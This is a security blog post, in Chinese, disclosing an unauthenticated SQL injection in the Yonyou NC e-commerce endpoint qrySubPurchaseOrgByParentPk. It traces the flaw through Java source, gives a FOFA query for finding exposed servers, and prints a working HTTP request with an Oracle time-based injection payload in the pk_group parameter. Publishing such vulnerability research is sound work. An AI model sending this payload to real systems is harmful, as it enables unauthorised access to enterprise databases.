---
title: "用友NC qrySubPurchaseOrgByParentPk SQL注入漏洞"
source: https://mrxn.net/jswz/yonyou-nc-ebvp-register-qrySubPurchaseOrgByParentPk-sqli.html
asset_dir: assets/用友nc-qrysubpurchaseorgbyparentpk-sql注入漏洞
---

# 用友NC qrySubPurchaseOrgByParentPk SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/6/12 08:25
* 1358浏览
* [0评论](#comment)
* 25分钟阅读

深入探索

Web安全书籍

安全运维咨询

文件大小转换


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

[用友](https://mrxn.net/tag/用友)NC 是一种商业级的企业资源规划，为企业提供全面的管理解决方案，包括财务管理、采购管理、销售管理、人力资源管理等功能，基于云原生架构，深度应用新一代数字技术，打造开放、 互联、融合、智能的一体化云平台，支持公有云、混合云、专属云的灵活部署模式。聚焦数字化管理、数字化经营、数字化平台等三大企业数字化转型战略方向，提供涵盖数字营销、智能制造、财务共享、人力共享与协同，智慧采购、数字中台等18大解决方案，助力大型企业全面落地数字化和业务流程优化。用友NC电子商务平台的 `qrySubPurchaseOrgByParentPk` 接口存在[SQL注入](https://mrxn.net/tag/SQL注入)漏洞，未经身份验证的恶意攻击者利用 SQL 注入漏洞获取数据库中的信息（例如管理员后台密码、站点用户个人信息）之外，攻击者甚至可以在高权限下向服务器写入命令，进一步获取服务器系统权限。

SQL注入防护

# 影响版本

NC65

深入探索

服务器安全服务

编程语言教程

安全研究工具

# fofa语法

> `app="用友-UFIDA-NC"`

# 漏洞分析

直接看 `RegCommonController` 对应的 `doQuerySubPurchaseOrgByParentPk` 方法实现部分

```
public Object doQuerySubPurchaseOrgByParentPk(HttpServletRequest request, HttpServletResponse response) {
        String pkGroup = request.getParameter("pk_group");
        String strOrgFilter = request.getParameter("org_filter");
        List<OrgVO> orgList = null;
        List<OrgPOJO> orgPojoList = new ArrayList();

        try {
            orgList = this.getSRMRegisterQueryService().queryRegisterOrgsFilterByName(pkGroup, strOrgFilter);
            if (orgList == null || orgList.size() == 0) {
                return orgPojoList;
            }
```

深入探索

数据库

软件

物流软件安全

用户可控参数 `pk_group` 未经任何处理或校验过滤就直接带入 `queryRegisterOrgsFilterByName` 方法

```
public List<OrgVO> queryRegisterOrgsFilterByName(String pkGroup, String filterName) throws BusinessException {
        List<OrgVO> retVoList = new ArrayList();
        Map<String, RegisterOrgVO> pkOrgMap = this.queryRegisterOrgs(pkGroup);
        if (pkOrgMap != null && pkOrgMap.size() != 0) {
            Set<String> keySet = pkOrgMap.keySet();
```

又被带入 `queryRegisterOrgs` 方法，跟进

代码安全审计

```
public Map<String, RegisterOrgVO> queryRegisterOrgs(String pk_group) throws BusinessException {
        if (pk_group != null && !pk_group.isEmpty()) {
            Map<String, RegisterOrgVO> registerOrgs = new HashMap();
            SqlBuilder sql = new SqlBuilder();
            sql.append(" and ");
            sql.append("pk_group", pk_group);
            sql.append(" and ");
            sql.append("cregisterorgid", " != ", pk_group);
            sql.append(" and ");
            sql.append("enablestate", 2);
            RegisterOrgVO[] vos = null;

            try {
                VOQuery<RegisterOrgVO> query = new VOQuery(RegisterOrgVO.class);
                vos = (RegisterOrgVO[])query.query(sql.toString(), (String)null);
```

很明显的直接将参数拼接进sql语句中，造成[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。

而权限校验部分可以参考 [用友NC pkevalset SQL注入漏洞](https://mrxn.net/jswz/yonyou-nc-evalschedule-pkevalset-sqli.html) 部分

[![用友NC qrySubPurchaseOrgByParentPk SQL注入漏洞](images/img-001-83a95057bf3c.webp)](https://image.mrxn.net/519dfcacc3ce40d7960ec19110f97b71.webp)

# 漏洞复现

```
POST /ebvp/register/qrySubPurchaseOrgByParentPk HTTP/1.1
Host: nc65.mrxn.net
Content-Type: application/x-www-form-urlencoded

pk_group=1' AND 1337=DBMS_PIPE.RECEIVE_MESSAGE('any',3)--
```

[![用友NC qrySubPurchaseOrgByParentPk SQL注入漏洞](images/img-002-723356a523ce.webp)](https://image.mrxn.net/76192865ea6b4371845183a61ee78145.webp)

成功延时 3 秒

漏洞扫描服务

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#0day](https://mrxn.net/tag/0day)
* [#用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[用友NC qrySubPurchaseOrgByParentPk SQL注入漏洞](https://mrxn.net/jswz/yonyou-nc-ebvp-register-qrySubPurchaseOrgByParentPk-sqli.html)  
文章链接：<https://mrxn.net/jswz/yonyou-nc-ebvp-register-qrySubPurchaseOrgByParentPk-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/yonyou-nc-ebvp-register-qrySubPurchaseOrgByParentPk-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

Windows安全工具

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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